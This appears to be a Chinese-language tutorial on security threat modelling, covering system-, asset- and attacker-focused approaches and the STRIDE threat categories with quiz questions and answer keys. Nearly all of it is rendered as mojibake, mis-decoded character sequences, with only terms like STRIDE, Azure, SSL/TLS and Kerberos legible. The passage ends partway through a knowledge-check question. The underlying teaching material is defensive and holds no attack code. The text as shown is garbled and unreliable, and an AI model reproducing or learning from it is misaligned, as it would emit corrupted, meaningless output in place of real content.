å¯ä»¥é€‰æ‹©é‡ç‚¹å…³æ³¨å‘ç°éœ€è¦ä¿æŠ¤çš„æ–¹é¢æˆ–è€…æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸­çš„è¡Œä¸ºæ–¹å¼ã€‚ ç®€ä»‹é‡ç‚¹å…³æ³¨é‡è¦æ–¹é¢å…³æ³¨é€‚å½“çš„æ–¹é¢å¯ä»¥å¸®åŠ©ä½ å®šåˆ¶å¨èƒå»ºæ¨¡ç»ƒä¹ ï¼Œä»¥å¾—å‡ºä¼˜ç§€çš„æ•ˆæœã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š è®¾è®¡æ–‡ä»¶å…±äº«åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸“æ³¨äºä¿æŠ¤å…¶è¿›ç¨‹ã€æ•°æ®å­˜å‚¨å’Œæ•°æ®æµã€‚ è®¾è®¡æ–‡ä»¶å…±äº«åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸“æ³¨äºæ·±å…¥äº†è§£æ”»å‡»è€…ã€‚ åŒ…æ‹¬æ”»å‡»è€…çš„åŠ¨æœºä»¥åŠå¯èƒ½ç”¨äºæ”»å‡»åº”ç”¨ç¨‹åºçš„æ–¹å¼ åœ¨æ­¤æ¨¡å—ä¸­ï¼Œä½ å°†äº†è§£æ‰§è¡Œé’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹ çš„å«ä¹‰ã€‚ è¿˜ä¼šäº†è§£é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å¤§æ¦‚å·®å¼‚ã€‚ å­¦ä¹ ç›®æ ‡åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š å®šä¹‰é’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹  è¯´æ˜é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å¤§æ¦‚å·®å¼‚ æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ å¨èƒå»ºæ¨¡é’ˆå¯¹æ€§æ–¹æ³•å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§å¾ˆå¥½çš„æŠ€æœ¯ï¼Œå¯å¸®åŠ©ä½ åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ›´æ—©é˜¶æ®µå‘ç°é—®é¢˜ã€‚ é€‰æ‹©ä¾§é‡ç‚¹æ°å½“çš„æ–¹æ³•æœ‰åŠ©äºå®šåˆ¶å¨èƒå»ºæ¨¡ç»ƒä¹ ã€‚ ä½ å¯ä»¥å‘ç°æ›´å¤šå¯å¯¹å…¶æ‰§è¡Œæ“ä½œçš„å¨èƒå’Œè§£å†³å¨èƒçš„æ–¹æ³•ã€‚ ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•ç›®çš„æ˜¯ä¿æŠ¤æ•´ä¸ªç³»ç»Ÿã€‚ å…³æ³¨æ¯ä¸ªè¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ã€æ•°æ®æµã€å¤–éƒ¨å®ä½“å’Œä¿¡ä»»è¾¹ç•Œã€‚ åˆ©ç”¨æ­¤ä¿¡æ¯ï¼Œå¯ç”¨é€‰æ‹©å®‰å…¨æ§åˆ¶æªæ–½æ¥å¸®åŠ©ä¿æŠ¤ç³»ç»Ÿã€‚ æ­¤æ¡†æ¶æœ‰åŠ©äºåˆ†æç³»ç»ŸåŠå…¶å¯¹å…¶ä»–èµ„äº§çš„å½±å“ï¼Œå…·ä½“åŒ…æ‹¬ï¼š èµ„äº§ç±»å‹ ç¤ºä¾‹ é€»è¾‘ æºä»£ç ã€API å’Œé€»è¾‘å®‰å…¨æ§åˆ¶æªæ–½ ç‰©ç† æœåŠ¡å™¨å’Œç‰©ç†å®‰å…¨æ§åˆ¶èµ„äº§ ä¾§é‡æ”»å‡»è€…çš„æ–¹æ³•ä½ å¯ä»¥ç€çœ¼äºæ”»å‡»è€…ã€å…¶åŠ¨æœºã€æ–¹æ³•ï¼Œä»¥åŠä»–ä»¬èƒ½å¤Ÿåœ¨ç³»ç»Ÿä¸­é€ æˆç ´åçš„æ‰€æœ‰æ–¹å¼ã€‚ è¿™ç§æ–¹æ³•å…³æ³¨å…¥å£ç‚¹ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç³»ç»Ÿã€‚ ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œä½ å¯ä»¥ä¸“æ³¨äºåŒ…å«ç³»ç»Ÿé«˜åº¦æœºå¯†æ•°æ®çš„å…³é”®èµ„äº§ã€‚ é‡ç‚¹æ˜¯ä¿æŠ¤è¿™äº›èµ„äº§ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç³»ç»Ÿã€‚ ä¾§é‡èµ„äº§çš„æ–¹æ³•è¯„ä¼°æ¯é¡¹èµ„äº§çš„é£é™©ã€‚ æ­¤æ–¹æ³•åŸºäºåˆ†ç±»æ•°æ®å¤„ç†ç­‰åŠŸèƒ½ç¡®å®šå…³é”®èµ„äº§ï¼Œä¸»è¦ä¸“æ³¨äºä¿æŠ¤è¿™äº›èµ„äº§ã€‚ Microsoft å·¥ç¨‹å¸ˆè‡´åŠ›äºä¿æŠ¤ç³»ç»Ÿã€‚ æ¸—é€æµ‹è¯•å›¢é˜Ÿè‡´åŠ›äºä¿æŠ¤ç³»ç»Ÿå’Œäº†è§£æ”»å‡»è€…ã€‚ é’ˆå¯¹ç³»ç»Ÿçš„å’Œå…¶ä»–æ–¹é¢çš„æ–¹æ³•ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•çš„é‡è¦æ€§ä½¿ç”¨ Azure å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯æ˜¯å¾ˆå¥½çš„åšæ³•ã€‚ äº†è§£å®ƒçš„å·¥ä½œåŸç†ï¼Œäº†è§£å®ƒæ˜¯å¦‚ä½•ä¸ç³»ç»Ÿçš„æ¯ä¸ªéƒ¨åˆ†è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥æ›´å¥½åœ°é¿å…äº§ç”Ÿå®ç°éƒ¨ç½²åçš„æœªçŸ¥é£é™©ã€‚ æ¯•ç«Ÿï¼Œå¨èƒå»ºæ¨¡çš„ç›®æ ‡æ˜¯éªŒè¯ä¹‹å‰åšå‡ºçš„å‡è®¾ï¼Œç¡®å®šæ½œåœ¨çš„å¨èƒï¼Œå¹¶åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸä¸­æ›´æ—©åœ°é™ä½é£é™©ã€‚ ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•çš„å®è·µç¤ºä¾‹ è®©æˆ‘ä»¬ä»¥æ–‡ä»¶å…±äº«åº”ç”¨ç¨‹åºä¸ºä¾‹ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŸ¥çœ‹æ•°æ®æµå…³ç³»å›¾æ—¶ï¼Œå¯èƒ½ä¼šçœ‹åˆ°ä»¥ä¸‹æµï¼š ç”¨æˆ·è¯·æ±‚è®¿é—®åº”ç”¨ç¨‹åº èº«ä»½éªŒè¯æµå¯åŠ¨ ç”¨æˆ·ä¸å…¶ä»–ç”¨æˆ·å…±äº«æ–‡ä»¶ æ­¤æ–¹æ³•åˆ†æå¹¶ä¿æŠ¤æ¯ä¸ªå…ƒç´ ï¼Œ ä¾‹å¦‚ç”¨æˆ·ã€Web æœåŠ¡ã€èº«ä»½éªŒè¯æœåŠ¡ã€æ•°æ®å­˜å‚¨ã€Internet ä¸ Azure ä¹‹é—´çš„ä¿¡ä»»è¾¹ç•Œä»¥åŠæ•°æ®æµã€‚ é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•åŒ…å«å…¶ä»–ä¸€äº›æ–¹æ³•ï¼Œä½†å¯èƒ½éœ€è¦ä¸€ä¸€è¯•ç”¨æ‰èƒ½è·å¾—æ›´ç²¾ç»†çš„æ•ˆæœã€‚ çŸ¥è¯†æ£€æŸ¥ é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ A. ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œä½ å¯ä»¥ä¸€æ¬¡ä¸“æ³¨ä¸€ä¸ªå…³é”®èµ„äº§ï¼Œä»¥å¸®åŠ©ç¡®å®šæ‰€æœ‰æ½œåœ¨å¨èƒä»¥åŠé™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ B. æ­¤æ–¹æ³•å¯æä¾›æ½œåœ¨æ”»å‡»è€…çš„ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬å…¶æ‰‹æ®µã€åŠ¨æœºå’Œè¡ŒåŠ¨è®¡åˆ’ã€‚ C. æ­¤æ–¹æ³•å¯è®©ä½ ä¸“æ³¨äºæ”¹è¿›ç³»ç»Ÿå¤„ç†ç”¨æˆ·å’Œæ•°æ®çš„æ–¹æ³•ã€‚ å®ƒè¿˜ä¼šéªŒè¯å…³äºé€šè¿‡æœåŠ¡ä½¿ç”¨çš„ç‰©ç†å’Œé€»è¾‘èµ„äº§çš„å®‰å…¨å‡è®¾ã€‚ é’ˆå¯¹æ”»å‡»è€…çš„æ–¹æ³•æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ A. ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œä½ å¯ä»¥ä¸€æ¬¡ä¸“æ³¨ä¸€ä¸ªå…³é”®èµ„äº§ï¼Œä»¥è¯†åˆ«æ‰€æœ‰æ½œåœ¨å¨èƒä»¥åŠé™ä½é£é™©çš„æ–¹æ³•ã€‚ B. æ­¤æ–¹æ³•å¯æä¾›æ½œåœ¨æ”»å‡»è€…çš„ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬å…¶æ‰‹æ®µã€åŠ¨æœºå’Œè¡ŒåŠ¨è®¡åˆ’ã€‚ C. æ­¤æ–¹æ³•å¯è®©ä½ ä¸“æ³¨äºæ”¹è¿›ç³»ç»Ÿå¤„ç†ç”¨æˆ·å’Œæ•°æ®çš„æ–¹æ³•ã€‚ å®ƒè¿˜ä¼šéªŒè¯å…³äºé€šè¿‡æœåŠ¡ä½¿ç”¨çš„ç‰©ç†å’Œé€»è¾‘èµ„äº§çš„å®‰å…¨å‡è®¾ã€‚ å‚è€ƒç­”æ¡ˆï¼š == C == == B == è§£é‡Šï¼š A. æ­¤æ¡ç›®å¯¹åº”äºé’ˆå¯¹èµ„äº§çš„æ–¹æ³•ã€‚B. æ­¤æ¡ç›®å¯¹åº”äºé’ˆå¯¹æ”»å‡»è€…çš„æ–¹æ³•ã€‚C. é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•è€ƒå¯Ÿæ•´ä¸ªç³»ç»Ÿï¼Œè€Œä¸ä»…ä»…æ˜¯å…¶ä¸­çš„æŸäº›éƒ¨åˆ†ã€‚ A. æ­¤æ¡ç›®å¯¹åº”äºé’ˆå¯¹èµ„äº§çš„æ–¹æ³•ã€‚B. é’ˆå¯¹æ”»å‡»è€…çš„æ–¹æ³•åŸºäºæ”»å‡»è€…åŠå…¶æ”»å‡»è®¡åˆ’ã€‚C. æ­¤æ¡ç›®æè¿°é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•ã€‚ å°ç»“å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§æœ‰æ•ˆçš„æŠ€æœ¯ï¼Œå¯å¸®åŠ©ä½ ç¡®å®šå¨èƒä»¥åŠé™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ ä½ å¯ä»¥ä¾§é‡äºå‘ç°éœ€è¦ä¿æŠ¤çš„æ–¹é¢æˆ–è€…æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸­çš„è¡Œä¸ºæ–¹å¼ã€‚ ä½ äº†è§£äº†æ‰§è¡Œé’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹ çš„å«ä¹‰ã€‚ è¿˜äº†è§£äº†é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å·®å¼‚ã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å·²ç»å­¦ä¹ äº†ä»¥ä¸‹å†…å®¹ï¼š å®šä¹‰äº†é’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹  è¯´æ˜äº†é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å¤§æ¦‚å·®å¼‚ æ¨¡å—5 | ä½¿ç”¨æ¡†æ¶è¯†åˆ«å¨èƒå¹¶æ‰¾åˆ°å‡å°‘æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ä»‹ç»å¨èƒå»ºæ¨¡æ¡†æ¶å¯å¸®åŠ©ä½ ç”Ÿæˆæ½œåœ¨å¨èƒçš„åˆ—è¡¨ï¼Œå¹¶æ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ ä½ åªéœ€å…·å¤‡ä¿¡æ¯å®‰å…¨æ–¹é¢çš„åº”ç”¨çŸ¥è¯†ï¼Œæ¡†æ¶å°±å¯ä¸ºä½ åˆ—å‡ºå¨èƒçš„ä¸»è¦ç±»åˆ«ï¼Œä»¥ç¡®ä¿å®ƒä»¬å¾—åˆ°é€‚å½“çš„å¤„ç†ã€‚ ä½•æ—¶ä½¿ç”¨æ¡†æ¶æ­¤æ¡†æ¶åº”é€‚ç”¨äºä¸ºæ–°ç³»ç»Ÿæˆ–ç°æœ‰ç³»ç»Ÿåˆ›å»ºçš„æ¯ä¸ªæ•°æ®æµå…³ç³»å›¾ã€‚ ç›®çš„æ˜¯åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸå°½å¯èƒ½å¤šåœ°å‘ç°å¹¶ä¿®å¤é—®é¢˜ã€‚ ç­‰å¾…æ—¶é—´è¶Šé•¿ï¼Œå®¢æˆ·çš„é£é™©å°±è¶Šé«˜ã€‚ é¢„æœŸç»“æœæ¡†æ¶å°†ä¸ºä½ å‘ˆç°å…­ä¸ªä¸»è¦å¨èƒç±»åˆ«ï¼Œæ¯ä¸ªç±»åˆ«ä¸‹æœ‰æ— æ•°ä¸ªæ½œåœ¨å¨èƒã€‚ é€šè¿‡è¯¥æ¡†æ¶ï¼Œä½ å°†èƒ½å¤Ÿå›ç­”ä»¥ä¸‹é—®é¢˜ï¼š é€šä¿¡çš„åŒæ–¹æ˜¯å¦éƒ½é€šè¿‡äº†èº«ä»½éªŒè¯ï¼Ÿ å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•æ›´æ”¹ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ æ¯ä¸ªæ“ä½œæ˜¯å¦å¯ä»¥ç»‘å®šåˆ°æ ‡è¯†ï¼Ÿ å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•çœ‹åˆ°ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨èµ„æºå—é™çš„åŒºåŸŸï¼Ÿ å¦‚ä½•å¾—çŸ¥æŸäººå¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Ÿ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†äº†è§£æ¯ç§å¨èƒç±»åˆ«åŠå…¶ç›¸åº”çš„å®‰å…¨æ§åˆ¶ã€‚ å­¦ä¹ ç›®æ ‡åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š è®¨è®ºå¨èƒå»ºæ¨¡æ¡†æ¶ä¸­çš„æ¯ä¸ªå¨èƒç±»åˆ« äº†è§£æœ‰åŠ©äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å®‰å…¨æ§åˆ¶ æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ å¨èƒå»ºæ¨¡æ¡†æ¶å¨èƒå»ºæ¨¡æ¡†æ¶æŸ¥çœ‹æ•°æ®æµå…³ç³»å›¾ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼ˆåŒ…æ‹¬å®ƒä»¬çš„äº¤äº’ï¼‰ã€‚ è¿™æœ‰åŠ©äºå‘ç°æ½œåœ¨å¨èƒå’Œæ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹å¼ã€‚ å¨èƒç±»åˆ«Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨ STRIDE æ¡†æ¶ä¸­çš„å…­ä¸ªä¸»è¦å¨èƒç±»åˆ«æ¥å‘ç°å®‰å…¨è®¾è®¡é—®é¢˜ï¼š Category è¯´æ˜ æ¬ºéª— å†’å……æŸäººæˆ–æŸç‰© ç¯¡æ”¹ æœªç»æˆæƒæ›´æ”¹æ•°æ® å¦è®¤æ€§ ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£ ä¿¡æ¯æ³„éœ² æœªç»è®¸å¯æŸ¥çœ‹æ•°æ® æ‹’ç»æœåŠ¡ ç³»ç»Ÿç¹å¿™ æƒé™æå‡ æ‹¥æœ‰æœ¬ä¸åº”è¯¥æ‹¥æœ‰çš„æƒé™ å®‰å…¨æ§åˆ¶ç±»åˆ«æ¯ä¸ªå¨èƒç±»åˆ«éƒ½ä¸å®‰å…¨æ§åˆ¶å…³è”ï¼Œä»¥å¸®åŠ©ä½ é™ä½æˆ–æ¶ˆé™¤é£é™© ç±»åˆ« å®‰å…¨æ§åˆ¶ æè¿° æ¬ºéª— èº«ä»½éªŒè¯ å…¶èº«ä»½æ˜¯å¦å¦‚å…¶æ‰€è¿° ç¯¡æ”¹ å®Œæ•´æ€§ é˜²æ­¢æ¶æ„ä¿®æ”¹æ•°æ® å¦è®¤æ€§ ä¸å¯å¦è®¤æ€§ æ“ä½œä¸ç”¨æˆ·ç»‘å®š ä¿¡æ¯æ³„éœ² æœºå¯†æ€§ ä¿æŠ¤æ•°æ®å…é­æ„å¤–æ³„éœ² æ‹’ç»æœåŠ¡ å¯ç”¨æ€§ ç³»ç»Ÿé€‚å½“å¤„ç†æ‰€æœ‰è¯·æ±‚ ç‰¹æƒæå‡ æˆæƒ ç”¨æˆ·æ‹¥æœ‰æ‰§è¡Œè¯·æ±‚çš„é€‚å½“æƒé™ æˆ‘ä»¬åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­æ¥äº†è§£ä¸€ä¸‹å„ç§å¨èƒç±»åˆ«ã€‚ æ¬ºéª— - å†’å……æŸäººæˆ–æŸç‰©å½“æ¶æ„äººå‘˜æˆ–ç¨‹åºæˆåŠŸåœ°å†’å……ç”¨æˆ·æˆ–ç³»ç»Ÿè¿›è¡Œæ¶æ„æ´»åŠ¨æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ¬ºéª—ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š æ”»å‡»è€…é€šè¿‡çœ‹ä¼¼åˆæ³•çš„å¸æˆ·å‘ç”¨æˆ·å‘é€ä¸€å°å¸¦æœ‰æ¶æ„é“¾æ¥å’Œé™„ä»¶çš„ç”µå­é‚®ä»¶ï¼Œä»¥æ•è·ç”¨æˆ·çš„å‡­æ®ã€æ•°æ®å’Œè®¾å¤‡è®¿é—®æƒé™ æ”»å‡»è€…æ¬ºéª— SSID å’Œ IP åœ°å€ï¼ŒåŒæ—¶ä½¿ç”¨å¼€æ”¾ä¸”åŸæœ¬ä¸å®‰å…¨çš„ TCP/IP åè®®å‘å—å®³è€…å‘é€æ¶æ„çš„æœ‰æ•ˆè´Ÿè½½ å¯èƒ½é¢ä¸´æ¬ºéª—æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’å…ƒç´  åç§° å½¢çŠ¶ å®šä¹‰ è¿‡ç¨‹ ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨ å¤–éƒ¨å®ä½“ æ§åˆ¶æªæ–½ä¹‹å¤–çš„è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ï¼Œç”šè‡³å®Œå…¨æˆç†Ÿçš„åº”ç”¨ç¨‹åº äº¤äº’ åç§° äº¤äº’ å®šä¹‰ è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹ ä¸€ä¸ªä»»åŠ¡ä»ä»»åŠ¡æ¥æ”¶æ•°æ®æˆ–å‘ä»»åŠ¡å‘é€æ•°æ® è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨ ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ® è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“ ä¸€ä¸ªä»»åŠ¡å‘å¤–éƒ¨å®ä½“å‘é€æ•°æ®æˆ–ä»å¤–éƒ¨å®ä½“æ¥æ”¶æ•°æ® å¦‚ä½•é˜²æ­¢æ¬ºéª—æ”»å‡»èº«ä»½éªŒè¯éªŒè¯äº†ç”¨æˆ·å’Œç³»ç»Ÿçš„èº«ä»½æ˜¯å¦å±å®ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š å‘é€å’Œæ¥æ”¶ä½¿ç”¨æ•°å­—ç­¾åè¿›è¡Œç­¾åçš„æ¶ˆæ¯ï¼Œä»¥éªŒè¯æ¥æºå¹¶ç¡®ä¿æ¶ˆæ¯å®Œæ•´æ€§ ä½¿ç”¨ SSL/TLS ä¿æŠ¤æ•°æ®ä¼ è¾“ï¼Œä»¥åŠ å¯†ä¿¡æ¯æºå’Œç›®æ ‡ä¹‹é—´çš„æµé‡ ä½¿ç”¨å…·æœ‰æ—¶æ•ˆæœ‰é™çš„ä»¤ç‰Œã€å¯†ç æˆ–å¤šé‡èº«ä»½éªŒè¯çš„å”¯ä¸€å‡­æ®æ¥å¸®åŠ©ä¿æŠ¤ç”¨æˆ·ã€ç®¡ç†å‘˜å’ŒæœåŠ¡å¸æˆ· ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶å¯¹äºæ•°æ®ï¼š å“ˆå¸Œ æ¶ˆæ¯éªŒè¯ç  æ•°å­—ç­¾å å¯¹äºç³»ç»Ÿï¼š ç”¨æˆ·èº«ä»½éªŒè¯ Cookie èº«ä»½éªŒè¯ Kerberos SSL/TLS è¯ä¹¦ IPSec æ•°å­—ç­¾åçš„æ•°æ®åŒ… æ¨èé—®é¢˜ï¼šæ˜¯å¦å·²éªŒè¯é€šä¿¡åŒæ–¹çš„èº«ä»½ï¼Ÿ çŸ¥è¯†æ£€æŸ¥ å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹æ¬ºéª—çš„å®‰å…¨æ§åˆ¶ï¼Ÿ A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚ B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚ C. ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚ ç¯¡æ”¹ - æœªç»æˆæƒæ›´æ”¹æ•°æ®å½“æ¶æ„æ”»å‡»è€…æœªç»æˆæƒåœ¨ç³»ç»Ÿä¸­è¯»å–ã€ä¿®æ”¹ã€åˆ é™¤æˆ–æ’å…¥æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿç¯¡æ”¹ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ä¿®æ”¹ä¸´æ—¶å­˜å‚¨åœ¨ç¼“å­˜ä¸­ã€é€šè¿‡ç½‘ç»œå‘é€æˆ–æ°¸ä¹…å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ•°æ®ä»¥ç ´åæ•°æ®å®Œæ•´æ€§ å°†æ¶æ„æœ‰æ•ˆè´Ÿè½½æ’å…¥æµè§ˆå™¨ç¼“å­˜ä¸­ï¼Œä»¥å¯¼è‡´è¿›ç¨‹å’Œæ•°æ®å­˜å‚¨ä¸­çš„è¡Œä¸ºå¼‚å¸¸ é€šè¿‡å¼± API è°ƒç”¨å¤„ç†ä¿®æ”¹å†…å­˜ï¼Œå¯¼è‡´å´©æºƒå’Œæ³„æ¼æ•æ„Ÿé”™è¯¯æ¶ˆæ¯ å°†æ•°æ®é‡å®šå‘åˆ°è¢«å…¥ä¾µçš„è®¡ç®—æœºä»¥æ¥ç®¡ç³»ç»Ÿ è¯±ä½¿ç”¨æˆ·è¿æ¥ç½‘ç»œæˆ–ä¸‹è½½æ–‡ä»¶ï¼Œä»è€Œæˆäºˆä»–ä»¬æµé‡å’Œè®¾å¤‡è®¿é—®æƒé™ï¼ˆä¸æ¬ºéª—ç»“åˆä½¿ç”¨ï¼‰ å¯èƒ½é¢ä¸´ç¯¡æ”¹æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’å…ƒç´  åç§° å½¢çŠ¶ å®šä¹‰ è¿‡ç¨‹ ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨ æ•°æ®å­˜å‚¨ æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨ æ•°æ®æµ å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ äº¤äº’ åç§° äº¤äº’ å®šä¹‰ è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨ ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ® æ•°æ®æµ &lt;-&gt; ä¿¡ä»»è¾¹ç•Œ é€šè¿‡ Internet å°†æ•°æ®ä»å—ä¿¡ä»»çš„ç¯å¢ƒä¼ è¾“ç»™æŸäººï¼ˆåä¹‹äº¦ç„¶ï¼‰ å¦‚ä½•é˜²æ­¢ç¯¡æ”¹å®Œæ•´æ€§é˜²æ­¢æ¶æ„ä¿®æ”¹æ•°æ®ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š éªŒè¯è¾“å…¥ä»¥é˜²æ­¢å¤„ç†æ¶æ„æœ‰æ•ˆè´Ÿè½½å’Œé”™è¯¯å¤„ç†æ„å¤–è¡Œä¸º ä½¿ç”¨æ•°å­—ç­¾åå¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œä»¥ç¡®ä¿æ¶ˆæ¯ä¸è¢«ç¯¡æ”¹ ä½¿ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨åº”ç”¨æƒé™ ä½¿ç”¨ SSL/TLS ä¿æŠ¤ä¼ è¾“ åˆ›å»º IPSec éš§é“ï¼Œä»¥ä¿æŠ¤ç»ˆç»“ç‚¹ä¹‹é—´çš„é€šä¿¡ ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶ æ“ä½œç³»ç»Ÿå®Œæ•´æ€§æ§åˆ¶ è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) æ•°å­—ç­¾å æ¶ˆæ¯éªŒè¯ç  æ¨èé—®é¢˜ï¼šå¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•æ›´æ”¹ä¼ è¾“ä¸­çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ çŸ¥è¯†æ£€æŸ¥ å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹ç¯¡æ”¹çš„å®‰å…¨æ§åˆ¶ï¼Ÿ A. å‘ä»¶äººå¯¹ç”µå­é‚®ä»¶é™„ä»¶è¿›è¡ŒåŠ å¯†ï¼Œä»¥ä¾¿è®©æ”¶ä»¶äººçŸ¥é“ç”µå­é‚®ä»¶ç”±ä½•äººæ‰€å‘ã€‚ B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚ C. 